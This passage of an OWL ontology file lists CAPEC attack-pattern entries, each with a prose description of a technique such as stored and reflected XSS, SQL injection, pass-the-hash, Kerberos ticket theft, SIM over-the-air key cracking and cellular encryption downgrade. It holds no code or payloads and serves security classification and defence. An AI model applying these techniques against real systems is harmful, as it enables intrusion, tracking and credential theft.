        rdfs:comment "An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure. Most of them use only one security question . For instance, mother's maiden name tends to be a fairly popular one. Unfortunately in many cases this information is not very hard to find, especially if the attacker knows the legitimate user.

These generic security questions are also re-used across many applications, thus making them even more insecure. An attacker could for instance overhear a coworker talking to a bank representative at the work place and supplying their mother's maiden name for verification purposes. An attacker can then try to log in into one of the victim's accounts, click on \"forgot password\" and there is a good chance that the security question there will be to provide mother's maiden name.

A weak password recovery scheme totally undermines the effectiveness of a strong password scheme."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-501

    Annotations: 
        rdfs:comment "An adversary intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and prompt the target to enter sensitive data as if they were interacting with the trusted activity."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-51

    Annotations: 
        rdfs:comment "SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata (to effect a denial of service), and delete information about service provider interfaces. WS-Addressing is used to virtualize services, provide return addresses and other routing information, however, unless the WS-Addressing headers are protected they are vulnerable to rewriting. The attacker that can rewrite WS-addressing information gains the ability to route service requesters to any service providers, and the ability to route service provider response to any service. Content in a registry is deployed by the service provider. The registry in an SOA or Web Services system can be accessed by the service requester via UDDI or other protocol. The basic flow for the attacker consists of either altering the data at rest in the registry or uploading malicious content by spoofing a service provider. The service requester is then redirected to send its requests and/or responses to services the attacker controls."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-510

    Annotations: 
        rdfs:comment "An adversary, through a previously installed malicious application, performs malicious actions against a third-party Software as a Service (SaaS) application (also known as a cloud based application) by leveraging the persistent and implicit trust placed on a trusted user's session. This attack is executed after a trusted user is authenticated into a cloud service, \"piggy-backing\" on the authenticated session, and exploiting the fact that the cloud service believes it is only interacting with the trusted user. If successful, the actions embedded in the malicious application will be processed and accepted by the targeted SaaS application and executed at the trusted user's privilege level."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-52

    Annotations: 
        rdfs:comment "An attacker embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s)."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-53

    Annotations: 
        rdfs:comment "If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an attacker to embed the NULL mid-string while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in mid-string may be used."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-533

    Annotations: 
        rdfs:comment "An attacker introduces malicious code to the victim's system by altering the payload of a software update, allowing for additional compromise or site disruption at the victim location. These manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user to click a URL. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in his or her arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-536

    Annotations: 
        rdfs:comment "An attacker with access to data files and processes on a victim's system injects malicious data into critical operational data during configuration or recalibration, causing the victim's system to perform in a suboptimal manner that benefits the adversary."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-54

    Annotations: 
        rdfs:comment "An adversary, aware of an application's location (and possibly authorized to use the application), probes an application's structure and evaluates its robustness by submitting requests and examining responses. Often, this is accomplished by sending variants of expected queries in the hope that these modified queries might return information beyond what the expected set of queries would provide."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-546

    Annotations: 
        rdfs:comment "An adversary obtains unauthorized information due to insecure or incomplete data deletion in a multi-tenant environment. If a cloud provider fails to completely delete storage and data from former cloud tenants' systems/resources, once these resources are allocated to new, potentially malicious tenants, the latter can probe the provided resources for sensitive information still there."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-55

    Annotations: 
        rdfs:comment "An attacker gets access to the database table where hashes of passwords are stored. He then uses a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.

A password rainbow table stores hash chains for various passwords. A password chain is computed, starting from the original password, P, via a reduce(compression) function R and a hash function H. A recurrence relation exists where Xi+1 = R(H(Xi)), X0 = P. Then the hash chain of length n for the original password P can be formed: X1, X2, X3, ... , Xn-2, Xn-1, Xn, H(Xn). P and H(Xn) are then stored together in the rainbow table.

Constructing the rainbow tables takes a very long time and is computationally expensive. A separate table needs to be constructed for the various hash algorithms (e.g. SHA1, MD5, etc.). However, once a rainbow table is computed, it can be very effective in cracking the passwords that have been hashed without the use of salt."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-555

    Annotations: 
        rdfs:comment "This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-57

    Annotations: 
        rdfs:comment "This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to place man in the middle once SSL is terminated. Rest applications premise is that they leverage existing infrastructure to deliver web services functionality. An example of this is a Rest application that uses HTTP Get methods and receives a HTTP response with an XML document. These Rest style web services are deployed on existing infrastructure such as Apache and IIS web servers with no SOAP stack required. Unfortunately from a security standpoint, there frequently is no interoperable identity security mechanism deployed, so Rest developers often fall back to SSL to deliver security. In large data centers, SSL is typically terminated at the edge of the network - at the firewall, load balancer, or router. Once the SSL is terminated the HTTP request is in the clear (unless developers have hashed or encrypted the values, but this is rare). The attacker can utilize a sniffer such as Wireshark to snapshot the credentials, such as username and password that are passed in the clear once SSL is terminated.

Once the attacker gathers these credentials, they can submit requests to the web service provider just as authorized user do. There is not typically an authentication on the client side, beyond what is passed in the request itself so once this is compromised, then this is generally sufficient to compromise the service's authentication scheme."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-578

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in access control to disable security tools so that detection does not occur. This can take the form of killing processes, deleting registry keys so that tools do not start at run time, deleting log files, or other methods."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-58

    Annotations: 
        rdfs:comment "Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side. The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-586

    Annotations: 
        rdfs:comment "An adversary attempts to exploit an application by injecting additional, malicious content during its processing of serialized objects. Developers leverage serialization in order to convert data or state into a static, binary format for saving to disk or transferring over a network. These objects are then deserialized when needed to recover the data/state. By injecting a malformed object into a vulnerable application, an adversary can potentially compromise the application by manipulating the deserialization process. This can result in a number of unwanted outcomes, including remote code execution."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-588

    Annotations: 
        rdfs:comment "This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-59

    Annotations: 
        rdfs:comment "This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-591

    Annotations: 
        rdfs:comment "This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is “reflected” off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application. The most common method of this is through a phishing email where the adversary embeds the malicious script with a URL that the victim then clicks on. In processing the subsequent request, the vulnerable web application incorrectly considers the malicious script as valid input and uses it to creates a reposnse that is then sent back to the victim. To launch a successful Reflected XSS attack, an adversary looks for places where user-input is used directly in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-592

    Annotations: 
        rdfs:comment "This type of attack is a form of Cross-site Scripting (XSS) where a malicious script is persistenly “stored” within the data storage of a vulnerable web application. Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-593

    Annotations: 
        rdfs:comment "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-6

    Annotations: 
        rdfs:comment "An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-60

    Annotations: 
        rdfs:comment "This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-606

    Annotations: 
        rdfs:comment "An attacker, with control of a Cellular Rogue Base Station or through cooperation with a Malicious Mobile Network Operator can force the mobile device (e.g., the retransmission device) to use no encryption (A5/0 mode) or to use easily breakable encryption (A5/1 or A5/2 mode)."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-608

    Annotations: 
        rdfs:comment "The use of cryptanalytic techniques to derive cryptographic keys or otherwise effectively defeat cellular encryption to reveal traffic content. Some cellular encryption algorithms such as A5/1 and A5/2 (specified for GSM use) are known to be vulnerable to such attacks and commercial tools are available to execute these attacks and decrypt mobile phone conversations in real-time. Newer encryption algorithms in use by UMTS and LTE are stronger and currently believed to be less vulnerable to these types of attacks. Note, however, that an attacker with a Cellular Rogue Base Station can force the use of weak cellular encryption even by newer mobile devices."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-61

    Annotations: 
        rdfs:comment "The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-612

    Annotations: 
        rdfs:comment "In this attack scenario, the attacker passively listens for WiFi messages and logs the associated Media Access Control (MAC) addresses. These addresses are intended to be unique to each wireless device (although they can be configured and changed by software). Once the attacker is able to associate a MAC address with a particular user or set of users (for example, when attending a public event), the attacker can then scan for that MAC address to track that user in the future."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-613

    Annotations: 
        rdfs:comment "In this attack scenario, the attacker passively listens for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. These messages are frequently transmitted by WiFi access points (e.g., the retransmission device) as well as by clients that are accessing the network (e.g., the handset/mobile device). Once the attacker is able to associate an SSID with a particular user or set of users (for example, when attending a public event), the attacker can then scan for this SSID to track that user in the future."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-614

    Annotations: 
        rdfs:comment "SIM cards are the de facto trust anchor of mobile devices worldwide. The cards protect the mobile identity of subscribers, associate devices with phone numbers, and increasingly store payment credentials, for example in NFC-enabled phones with mobile wallets. This attack leverages over-the-air (OTA) updates deployed via cryptographically-secured SMS messages to deliver executable code to the SIM. By cracking the DES key, an attacker can send properly signed binary SMS messages to a device, which are treated as Java applets and are executed on the SIM. These applets are allowed to send SMS, change voicemail numbers, and query the phone location, among many other predefined functions. These capabilities alone provide plenty of potential for abuse."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-618

    Annotations: 
        rdfs:comment "In this attack scenario, the attacker uses knowledge of the target’s mobile phone number (i.e., the number associated with the SIM used in the retransmission device) to cause the cellular network to send broadcast messages to alert the mobile device. Since the network knows which cell tower the target’s mobile device is attached to, the broadcast messages are only sent in the Location Area Code (LAC) where the target is currently located. By triggering the cellular broadcast message and then listening for the presence or absence of that message, an attacker could verify that the target is in (or not in) a given location."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-619

    Annotations: 
        rdfs:comment "In this attack scenario, the attacker passively monitors the signal strength of the target’s cellular RF signal or WiFi RF signal and uses the strength of the signal (with directional antennas and/or from multiple listening points at once) to identify the source location of the signal. Obtaining the signal of the target can be accomplished through multiple techniques such as through Cellular Broadcast Message Request or through the use of IMSI Tracking or WiFi MAC Address Tracking."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-62

    Annotations: 
        rdfs:comment "An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level.

This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply \"riding\" the existing session cookie."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-620

    Annotations: 
        rdfs:comment "An attacker forces the encryption level to be lowered, thus enabling a successful attack against the encrypted data."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-621

    Annotations: 
        rdfs:comment "An attacker may intercept and log encrypted transmissions for the purpose of analyzing metadata such as packet timing and sizes. Although the actual data may be encrypted, this metadata may reveal valuable information to an attacker. Note that this attack is applicable to VOIP data as well as application data, especially for interactive apps that require precise timing and low-latency (e.g. thin-clients)."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-622

    Annotations: 
        rdfs:comment "In this attack scenario, the attacker passively monitors electromagnetic emanations that are produced by the targeted electronic device as an unintentional side-effect of its processing. From these emanations, the attacker derives information about the data that is being processed (e.g. the attacker can recover cryptographic keys by monitoring emanations associated with cryptographic processing). This style of attack requires proximal access to the device, however attacks have been demonstrated at public conferences that work at distances of up to 10-15 feet. There have not been any significant studies to determine the maximum practical distance for such attacks. Since the attack is passive, it is nearly impossible to detect and the targeted device will continue to operate as normal after a successful attack."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-623

    Annotations: 
        rdfs:comment "Compromising Emanations (CE) are defined as unintentional signals which an attacker may intercept and analyze to disclose the information processed by the targeted equipment. Commercial mobile devices and retransmission devices have displays, buttons, microchips, and radios that emit mechanical emissions in the form of sound or vibrations. Capturing these emissions can help an adversary understand what the device is doing."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-63

    Annotations: 
        rdfs:comment "An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-633

    Types: 
        CAPECEntries
    
    
Individual: CAPEC-634

    Annotations: 
        rdfs:comment "The adversary exploits the target system's audio and video functionalities through malware or scheduled tasks. The goal is to capture sensitive information about the target for financial, personal, political, or other gains which is accomplished by collecting communication data between two parties via the use of peripheral devices (e.g. microphones and webcams) or applications with audio and video capabilities (e.g. Skype) on a system."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-637

    Annotations: 
        rdfs:comment "The adversary exploits an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. Data copied to the clipboard can be accessed by other applications, such as malware built to exfiltrate or log clipboard contents on a periodic basis. In this way, the adversary aims to garner information to which he is unauthorized."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-639

    Annotations: 
        rdfs:comment "An adversary obtains unauthorized information due to improperly protected files. If an application stores sensitive information in a file that is not protected by proper access control, then an adversary can access the file and search for sensitive information."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-64

    Annotations: 
        rdfs:comment "This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple ways of encoding a URL and abuse the interpretation of the URL. A URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-642

    Annotations: 
        rdfs:comment "Adversaries know that certain binaries will be regularly executed as part of normal processing. If these binaries are not protected with the appropriate file system permissions, it could be possible to replace them with malware. This malware might be executed at higher system permission levels. A variation of this pattern is to discover self-extracting installation packages that unpack binaries to directories with weak file permissions which it does not clean up appropriately. These binaries can be replaced by malware, which can then be executed."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-643

    Annotations: 
        rdfs:comment "An adversary discovers connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. Through the identification of shared folders/drives between systems, the adversary may further their goals of locating and collecting sensitive information/files, or map potential routes for lateral movement within the network."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-644

    Annotations: 
        rdfs:comment "An adversary uses stolen hash values for a user's credentials (username and password) to access systems managed under the same credential framwork that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols. When authenticating via LM or NTLM, the hashed credentials' associated plaintext credentials are not requried for successful authentication. Therefore, if an adversary can obtain the hashed credentials of a user, he can then pass these hash values to the server or service to authenticate without needing to brute-force the hashes to obtain their cleartext values. The adversary can then impersonate the user and laterally move within the network. This technique can be performed against any operating system which leverages the LM or NTLM protocols."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-645

    Annotations: 
        rdfs:comment "An adversary uses stolen Kerberos tickets to access systems that leverage the Kerberos authentication protocol. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. An adversary can obtain any one of these tickets (e.g. Service Ticket, Ticket Granting Ticket, Silver Ticket, or Golden Ticket) to authenticate to a system without needing the account's credentials. Depending on the ticket obtained, the adversary may be able to access a particular resource or generate TGTs for any account within an Active Directory Domain."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-647

    Annotations: 
        rdfs:comment "An adversary exploits a weakness in authorization to gather system-specific data and sensitive information within a registry (e.g., Windows Registry, Mac plist). These contain information about the system configuration, software, operating system, and security. The adversary can leverage information gathered in order to carry out further attacks."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-648

    Annotations: 
        rdfs:comment "An adversary gathers sensitive information by exploiting the system's screen capture functionality. Through screenshots, the adversary aims to see what happens on the screen over the course of an operation. The adversary can leverage information gathered in order to carry out further attacks."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-65

    Annotations: 
        rdfs:comment "An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-66

    Annotations: 
        rdfs:comment "This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input. When specially crafted user-controlled input consisting of SQL syntax is used without proper validation as part of SQL queries, it is possible to glean information from the database in ways not envisaged during application design. Depending upon the database and the design of the application, it may also be possible to leverage injection to have the database execute system-related commands of the attackers' choice. SQL Injection enables an attacker to talk directly to the database, thus bypassing the application completely. Successful injection can cause information disclosure as well as ability to add or modify data in the database. In order to successfully inject SQL and retrieve information from a database, an attacker:"^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-67

    Annotations: 
        rdfs:comment "This attack targets the format string vulnerabilities in the syslog() function. An attacker would typically inject malicious input in the format string parameter of the syslog function. This is a common problem, and many public vulnerabilities and associated exploits have been posted."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-68

    Annotations: 
        rdfs:comment "Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-69

    Annotations: 
        rdfs:comment "This attack targets programs running with elevated privileges. The attacker would try to leverage a bug in the running program and get arbitrary code to execute with elevated privileges. For instance an attacker would look for programs that write to the system directories or registry keys (such as HKLM, which stores a number of critical Windows environment variables). These programs are typically running with elevated privileges and have usually not been designed with security in mind. Such programs are excellent exploit targets because they yield lots of power when they break. The malicious user try to execute its code at the same level as a privileged system call."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-7

    Annotations: 
        rdfs:comment "Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the adversary constructs input strings that probe the target through simple Boolean SQL expressions. The adversary can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the adversary determines how and where the target is vulnerable to SQL Injection."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-70

    Annotations: 
        rdfs:comment "An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords.

Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. \"secret\" or \"password\") that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-71

    Annotations: 
        rdfs:comment "An attacker may provide a Unicode string to a system component that is not Unicode aware and use that to circumvent the filter or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-72

    Annotations: 
        rdfs:comment "This attack targets the encoding of the URL. An attacker can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL. An URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The attacker could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an attacker may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section)."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-73

    Annotations: 
        rdfs:comment "An attack of this type involves an adversary inserting malicious characters (such as a XSS redirection) into a filename, directly or indirectly that is then used by the target software to generate HTML text or other potentially executable content. Many websites rely on user-generated content and dynamically build resources like files, filenames, and URL links directly from user supplied data. In this attack pattern, the attacker uploads code that can execute in the client browser and/or redirect the client browser to a site that the attacker owns. All XSS attack payload variants can be used to pass and exploit these vulnerabilities."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-74

    Annotations: 
        rdfs:comment "The adversary modifies state information maintained by the target software in user-accessible locations. If successful, the target software will use this tainted state information and execute in an unintended manner. State management is an important function within an application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-75

    Annotations: 
        rdfs:comment "Generally these are manually edited files that are not in the preview of the system administrators, any ability on the attackers' behalf to modify these files, for example in a CVS repository, gives unauthorized access directly to the application, the same as authorized users."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-76

    Annotations: 
        rdfs:comment "An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-77

    Annotations: 
        rdfs:comment "This attack targets user controlled variables (DEBUG=1, PHP Globals, and So Forth). An attacker can override environment variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In extreme cases, the attacker can change variables controlling the business logic of the application. For instance, in languages like PHP, a number of poorly set default configurations may allow the user to override variables."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-78

    Annotations: 
        rdfs:comment "This attack targets the use of the backslash in alternate encoding. An attacker can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the attacker tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-79

    Annotations: 
        rdfs:comment "This attack targets the encoding of the Slash characters. An attacker would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the attacker many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-8

    Annotations: 
        rdfs:comment "This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An attacker who has access to an API may try to embed malicious code in the API function call and exploit a buffer overflow vulnerability in the function's implementation. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-80

    Annotations: 
        rdfs:comment "This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the \"shortest possible\" encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-81

    Annotations: 
        rdfs:comment "Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to \"Log Injection-Tampering-Forging\" except that in this case, the attack is targeting the logs of the web server and not the application."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-82

    Annotations: 
